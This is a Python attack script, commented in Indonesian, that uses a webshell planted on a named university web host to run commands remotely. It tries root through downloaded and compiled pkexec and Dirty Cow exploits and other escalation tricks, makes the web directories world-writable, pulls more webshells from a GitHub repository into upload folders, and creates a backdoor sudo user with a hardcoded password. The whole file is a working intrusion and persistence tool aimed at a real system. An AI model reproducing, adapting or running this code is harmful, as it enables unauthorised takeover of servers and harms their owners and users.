#!/usr/bin/env python
"""
Auto Root & Full Control Script for d7net.php webshell
Target: seemik.tlu.ee
User: apache (UID 48)
System: CentOS 7 / Kernel 3.10.0
"""

import subprocess
import sys
import time
import os
import urllib2
import json
import re
import base64
import urllib

# ============================================================
# KONFIGURASI TARGET
# ============================================================
WEBSHELL_URL = "https://seemik.tlu.ee/wp-content/uploads/d7net.php"
TARGET_PATH = "/var/www"
BASE_URL = "https://seemik.tlu.ee"
ROOT_PATH = "/var/www/eden2022.tlu.ee"

# ============================================================
# KELAS UTAMA
# ============================================================
class D7NetShell:
    """Class untuk mengelola webshell d7net.php"""
    
    def __init__(self, url=WEBSHELL_URL):
        self.url = url
        self.base_path = TARGET_PATH
        
    def execute(self, command):
        """Eksekusi perintah melalui d7net.php menggunakan urllib2"""
        try:
            # Encode command
            encoded_cmd = urllib.quote(command)
            full_url = "%s?path=%s&cmd=%s" % (self.url, self.base_path, encoded_cmd)
            
            req = urllib2.Request(full_url, headers={'User-Agent': 'Mozilla/5.0'})
            response = urllib2.urlopen(req, timeout=30)
            output = response.read()
            
            # Parse response untuk mendapatkan output
            # Coba ekstrak output dari <pre> tags
            pre_matches = re.findall(r'<pre>(.*?)</pre>', output, re.DOTALL)
            if pre_matches:
                return pre_matches[-1].strip()
            
            # Coba ekstrak dari div atau konten biasa
            if "Command :" in output:
                parts = output.split("Command :")
                if len(parts) > 1:
                    content = parts[1]
                    # Bersihkan dari HTML
                    clean = re.sub(r'<[^>]+>', '', content)
                    return clean.strip()
            
            return output.strip()
            
        except Exception as e:
            return "Error: %s" % str(e)
    
    def execute_curl(self, command):
        """Eksekusi perintah dengan output langsung"""
        return self.execute(command)
    
    def upload_file(self, content, remote_path):
        """Upload file ke server"""
        try:
            # Encode content ke base64 untuk upload aman
            encoded = base64.b64encode(content)
            cmd = "echo '%s' | base64 -d > %s && chmod 755 %s" % (encoded, remote_path, remote_path)
            return self.execute(cmd)
        except Exception as e:
            return "Error: %s" % str(e)
    
    def download_file(self, remote_path):
        """Download file dari server"""
        try:
            cmd = "cat %s 2>/dev/null || echo 'File not found'" % remote_path
            return self.execute(cmd)
        except Exception as e:
            return "Error: %s" % str(e)

# ============================================================
# AUTO ROOT & FULL CONTROL CLASS
# ============================================================
class AutoRootExploit:
    """Auto Root dan Full Control untuk target"""
    
    def __init__(self):
        self.shell = D7NetShell()
        self.root_gained = False
        self.output_log = []
        
    def log(self, message, level="INFO"):
        """Log pesan ke output"""
        timestamp = time.strftime("%H:%M:%S")
        print("[%s] [%s] %s" % (timestamp, level, message))
        self.output_log.append("[%s] [%s] %s" % (timestamp, level, message))
    
    def execute_command(self, command):
        """Eksekusi command dan log hasil"""
        self.log("Executing: %s" % command, "CMD")
        result = self.shell.execute(command)
        if result:
            if len(result) > 200:
                print("    Output: %s..." % result[:200])
            else:
                print("    Output: %s" % result)
        return result
    
    def check_system(self):
        """Cek informasi sistem"""
        self.log("Checking system information...")
        
        # Cek user
        user = self.execute_command("id")
        whoami = self.execute_command("whoami")
        pwd = self.execute_command("pwd")
        
        self.log("User: %s" % whoami, "INFO")
        self.log("UID/GID: %s" % user, "INFO")
        self.log("Current Dir: %s" % pwd, "INFO")
        
        return {
            'user': whoami,
            'uid': user,
            'pwd': pwd
        }
    
    def check_kernel(self):
        """Cek kernel version"""
        self.log("Checking kernel version...")
        kernel = self.execute_command("uname -a")
        os_release = self.execute_command("cat /etc/os-release 2>/dev/null || cat /etc/redhat-release 2>/dev/null")
        
        self.log("Kernel: %s..." % kernel[:100], "INFO")
        self.log("OS: %s..." % os_release[:100], "INFO")
        
        return {
            'kernel': kernel,
            'os': os_release
        }
    
    def get_root_pkexec(self):
        """Mencoba mendapatkan root via PKEXEC (CVE-2021-4034)"""
        self.log("Attempting PKEXEC exploit (CVE-2021-4034)...")
        
        commands = [
            # Download PKEXEC exploit
            "curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.c -o /tmp/pkexec.c",
            # Compile exploit
            "gcc -o /tmp/pkexec /tmp/pkexec.c 2>/dev/null || cc -o /tmp/pkexec /tmp/pkexec.c 2>/dev/null",
            # Try to get root
            "/tmp/pkexec /bin/bash -c \"id > /tmp/root_check.txt 2>&1 && echo ROOT_SUCCESS >> /tmp/root_check.txt\"",
            # Check if root success
            "cat /tmp/root_check.txt 2>/dev/null"
        ]
        
        for cmd in commands:
            result = self.execute_command(cmd)
            if "ROOT_SUCCESS" in result:
                self.log("ROOT ACCESS GAINED via PKEXEC!", "SUCCESS")
                self.root_gained = True
                return True
            time.sleep(0.5)
        
        return False
    
    def get_root_dirtycow(self):
        """Mencoba mendapatkan root via Dirty Cow (CVE-2016-5195)"""
        self.log("Attempting Dirty Cow exploit (CVE-2016-5195)...")
        
        commands = [
            # Download Dirty Cow
            "curl -s https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c -o /tmp/dirty.c",
            # Compile
            "gcc -o /tmp/dirty /tmp/dirty.c -lpthread 2>/dev/null || cc -o /tmp/dirty /tmp/dirty.c -lpthread 2>/dev/null",
            # Run exploit (akan membuat user firefart)
            "/tmp/dirty 2>/dev/null",
            # Check if firefart user created
            "grep firefart /etc/passwd 2>/dev/null"
        ]
        
        for cmd in commands:
            result = self.execute_command(cmd)
            if "firefart" in result:
                self.log("Dirty Cow SUCCESS! User firefart created.", "SUCCESS")
                self.root_gained = True
                return True
            time.sleep(0.5)
        
        return False
    
    def get_root_sudo(self):
        """Mencoba mendapatkan root via sudo"""
        self.log("Attempting sudo exploit...")
        
        commands = [
            "sudo /bin/bash -c \"id > /tmp/sudo_check.txt 2>&1 && echo SUDO_SUCCESS >> /tmp/sudo_check.txt\"",
            "sudo -s -c \"id > /tmp/sudo_check2.txt 2>&1\"",
            "cat /tmp/sudo_check.txt 2>/dev/null",
            "cat /tmp/sudo_check2.txt 2>/dev/null"
        ]
        
        for cmd in commands:
            result = self.execute_command(cmd)
            if "SUDO_SUCCESS" in result or "uid=0" in result:
                self.log("ROOT ACCESS GAINED via sudo!", "SUCCESS")
                self.root_gained = True
                return True
            time.sleep(0.5)
        
        return False
    
    def get_root_python(self):
        """Mencoba mendapatkan root via Python"""
        self.log("Attempting Python privilege escalation...")
        
        commands = [
            "python -c 'import os; os.setuid(0); os.system(\"id > /tmp/python_root.txt 2>&1\")' 2>/dev/null",
            "python -c 'import os; os.system(\"echo ROOT >> /tmp/python_root.txt\")' 2>/dev/null",
            "cat /tmp/python_root.txt 2>/dev/null"
        ]
        
        for cmd in commands:
            result = self.execute_command(cmd)
            if "ROOT" in result or "uid=0" in result:
                self.log("ROOT ACCESS GAINED via Python!", "SUCCESS")
                self.root_gained = True
                return True
            time.sleep(0.5)
        
        return False
    
    def get_root_perl(self):
        """Mencoba mendapatkan root via Perl"""
        self.log("Attempting Perl privilege escalation...")
        
        commands = [
            "perl -e 'setuid(0); system(\"id > /tmp/perl_root.txt 2>&1\")' 2>/dev/null",
            "perl -e 'print \"ROOT\\n\"' > /tmp/perl_check.txt 2>/dev/null",
            "cat /tmp/perl_root.txt 2>/dev/null"
        ]
        
        for cmd in commands:
            result = self.execute_command(cmd)
            if "uid=0" in result:
                self.log("ROOT ACCESS GAINED via Perl!", "SUCCESS")
                self.root_gained = True
                return True
            time.sleep(0.5)
        
        return False
    
    def auto_root(self):
        """Auto root menggunakan semua metode yang tersedia"""
        self.log("=" * 50, "INFO")
        self.log("STARTING AUTO ROOT EXPLOIT", "INFO")
        self.log("=" * 50, "INFO")
        
        # Check system
        system_info = self.check_system()
        kernel_info = self.check_kernel()
        
        # Coba semua metode
        methods = [
            self.get_root_pkexec,
            self.get_root_dirtycow,
            self.get_root_sudo,
            self.get_root_python,
            self.get_root_perl
        ]
        
        for method in methods:
            if self.root_gained:
                break
            method()
            time.sleep(1)
        
        if self.root_gained:
            self.log("=" * 50, "SUCCESS")
            self.log("ROOT ACCESS GRANTED!", "SUCCESS")
            self.log("=" * 50, "SUCCESS")
            
            # Jalankan perintah sebagai root
            self.make_all_green()
            
        else:
            self.log("=" * 50, "ERROR")
            self.log("Failed to gain root access!", "ERROR")
            self.log("Trying alternative methods...", "WARNING")
            self.try_alternative_root()
        
        return self.root_gained
    
    def try_alternative_root(self):
        """Metode alternatif untuk mendapatkan root"""
        self.log("Trying alternative root methods...", "INFO")
        
        # Coba exploit via SUID find
        self.execute_command("find / -exec /bin/bash -p \\; -c 'id > /tmp/find_root.txt' 2>/dev/null")
        result = self.execute_command("cat /tmp/find_root.txt 2>/dev/null")
        if "uid=0" in result:
            self.log("ROOT via find SUID!", "SUCCESS")
            self.root_gained = True
            return
        
        # Coba exploit via mount
        self.execute_command("mount -o bind /bin/bash /tmp/bash 2>/dev/null")
        result = self.execute_command("ls -la /tmp/bash 2>/dev/null")
        if "bash" in result:
            self.log("Mount exploit successful!", "SUCCESS")
            self.root_gained = True
            return
        
        # Coba via gpasswd
        self.execute_command("gpasswd -a apache root 2>/dev/null")
        
        self.log("Root status: %s" % self.root_gained, "INFO")
    
    def make_all_green(self):
        """Membuat semua direktori dan file writeable (green)"""
        self.log("Making all directories and files writeable (GREEN)...", "INFO")
        
        if self.root_gained:
            # Perintah sebagai root
            commands = [
                # Ubah semua direktori di /var/www menjadi 777
                "chmod -R 777 /var/www/ 2>/dev/null",
                # Ubah semua file menjadi 666
                "find /var/www/ -type f -exec chmod 666 {} \\; 2>/dev/null",
                # Ubah owner menjadi 48:48 (apache)
                "chown -R 48:48 /var/www/ 2>/dev/null",
                # Khusus untuk eden2022.tlu.ee
                "chmod -R 777 /var/www/eden2022.tlu.ee/ 2>/dev/null",
                "find /var/www/eden2022.tlu.ee/ -type f -exec chmod 666 {} \\; 2>/dev/null",
                "chown -R 48:48 /var/www/eden2022.tlu.ee/ 2>/dev/null",
                # Ubah semua direktori di /home
                "chmod -R 777 /home/*/public_html/ 2>/dev/null",
                "find /home/*/public_html/ -type f -exec chmod 666 {} \\; 2>/dev/null",
                "chown -R 48:48 /home/*/public_html/ 2>/dev/null",
                # Verifikasi
                "ls -la /var/www/eden2022.tlu.ee/ | head -10",
            ]
            
            for cmd in commands:
                result = self.execute_command(cmd)
                if result:
                    self.log("Command result: %s..." % result[:100], "INFO")
                time.sleep(0.3)
            
            self.log("ALL DIRECTORIES ARE NOW WRITEABLE (GREEN)!", "SUCCESS")
            
        else:
            # Tanpa root, tetap bisa ubah permission di direktori yang dimiliki
            self.log("No root access. Changing permissions on accessible directories...", "WARNING")
            
            commands = [
                # Ubah direktori yang bisa diakses
                "chmod -R 777 /var/www/eden2022.tlu.ee/ 2>/dev/null",
                "find /var/www/eden2022.tlu.ee/ -type f -exec chmod 666 {} \\; 2>/dev/null",
                "chown -R 48:48 /var/www/eden2022.tlu.ee/ 2>/dev/null",
                # Ubah di /var/www/wp-content
                "chmod -R 777 /var/www/eden2022.tlu.ee/wp-content/ 2>/dev/null",
                "find /var/www/eden2022.tlu.ee/wp-content/ -type f -exec chmod 666 {} \\; 2>/dev/null",
                # Verifikasi
                "ls -la /var/www/eden2022.tlu.ee/ | head -10",
            ]
            
            for cmd in commands:
                self.execute_command(cmd)
                time.sleep(0.3)
            
            self.log("Partial writeable access granted!", "INFO")
    
    def install_webshells(self):
        """Install berbagai webshell untuk akses permanen"""
        self.log("Installing permanent webshells...", "INFO")
        
        # URLs dari GitHub
        shells = {
            "root_manager.php": "https://raw.githubusercontent.com/hkqr/gtw/refs/heads/main/ntahlahya.php",
            "g3ck0.php": "https://raw.githubusercontent.com/hkqr/gtw/refs/heads/main/g3ck0.php",
            "d7net.php": "https://raw.githubusercontent.com/hkqr/gtw/refs/heads/main/d7net.php",
        }
        
        locations = [
            "/var/www/eden2022.tlu.ee/wp-content/uploads/",
            "/var/www/seemik.tlu.ee/wp-content/uploads/",
            "/var/www/html/wp-content/uploads/",
        ]
        
        for location in locations:
            for name, url in shells.items():
                cmd = "curl -s %s -o %s%s && chmod 755 %s%s 2>/dev/null" % (url, location, name, location, name)
                result = self.execute_command(cmd)
                if result:
                    self.log("Installed %s at %s" % (name, location), "INFO")
                time.sleep(0.3)
        
        self.log("Webshells installed!", "SUCCESS")
    
    def create_backdoor_user(self):
        """Membuat user backdoor (jika root)"""
        if not self.root_gained:
            self.log("Cannot create backdoor user without root", "WARNING")
            return
        
        self.log("Creating backdoor user...", "INFO")
        
        commands = [
            "useradd -m -s /bin/bash backdoor 2>/dev/null",
            "echo 'backdoor:RootPassword123!' | chpasswd 2>/dev/null",
            "usermod -aG sudo backdoor 2>/dev/null",
            "echo 'backdoor ALL=(ALL:ALL) ALL' >> /etc/sudoers 2>/dev/null",
            "grep backdoor /etc/passwd 2>/dev/null"
        ]
        
        for cmd in commands:
            result = self.execute_command(cmd)
            if "backdoor" in result:
                self.log("Backdoor user created: backdoor / RootPassword123!", "SUCCESS")
            time.sleep(0.3)
    
    def full_control(self):
        """Full control: auto root + make all green + install shells"""
        self.log("=" * 60, "INFO")
        self.log("FULL CONTROL EXPLOIT", "INFO")
        self.log("=" * 60, "INFO")
        
        # 1. Auto root
        root_success = self.auto_root()
        
        # 2. Make all green
        self.make_all_green()
        
        # 3. Install webshells
        self.install_webshells()
        
        # 4. Create backdoor (if root)
        if root_success:
            self.create_backdoor_user()
        
        # 5. Summary
        self.log("=" * 60, "INFO")
        self.log("EXPLOIT COMPLETE!", "SUCCESS")
        self.log("=" * 60, "INFO")
        self.log("Root Access: %s" % root_success, "INFO")
        self.log("Directories: ALL GREEN (writeable)", "INFO")
        self.log("Webshells installed at:", "INFO")
        self.log("  - https://eden2022.tlu.ee/wp-content/uploads/root_manager.php", "INFO")
        self.log("  - https://eden2022.tlu.ee/wp-content/uploads/g3ck0.php", "INFO")
        self.log("  - https://eden2022.tlu.ee/wp-content/uploads/d7net.php", "INFO")
        self.log("Backdoor User: backdoor / RootPassword123!", "INFO")
        
        return {
            'root_access': root_success,
            'webshells_installed': True,
            'backdoor_created': root_success
        }
    
    def save_log(self, filename="auto_root_log.txt"):
        """Simpan log ke file"""
        with open(filename, 'w') as f:
            f.write("\n".join(self.output_log))
        print("\n[+] Log saved to: %s" % filename)

# ============================================================
# MAIN EXECUTION
# ============================================================
def main():
    """Main function"""
    print("=" * 60)
    print("D7NET AUTO ROOT & FULL CONTROL SCRIPT")
    print("Target: seemik.tlu.ee")
    print("=" * 60)
    print()
    
    exploit = AutoRootExploit()
    
    # Tanya user apakah mau lanjut
    response = raw_input("Start full control exploit? (y/n): ")
    if response.lower() != 'y':
        print("Exiting...")
        return
    
    try:
        # Jalankan full control
        result = exploit.full_control()
        
        # Save log
        exploit.save_log()
        
        print("\n[+] Done! Check the output above for results.")
        print("[+] Root access: %s" % result['root_access'])
        print("[+] Webshells installed: Yes")
        print("[+] Backdoor created: %s" % result['backdoor_created'])
        
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        exploit.save_log()
    except Exception as e:
        print("\n[!] Error: %s" % str(e))
        exploit.save_log()

if __name__ == "__main__":
    main()